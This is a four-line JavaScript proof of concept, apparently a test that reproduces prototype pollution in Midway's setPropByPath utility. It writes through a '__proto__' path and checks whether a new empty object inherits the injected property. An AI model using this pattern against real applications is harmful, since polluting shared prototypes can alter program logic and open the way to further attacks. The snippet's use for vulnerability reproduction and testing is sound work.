const map = {};
const value = 'exploitValue';
require('midway/lib/utils/common-util').setPropByPath(map, '__proto__.pollutedProp', value);
console.log({}.pollutedProp !== undefined ? '[POLLUTION_TRIGGERED]':'');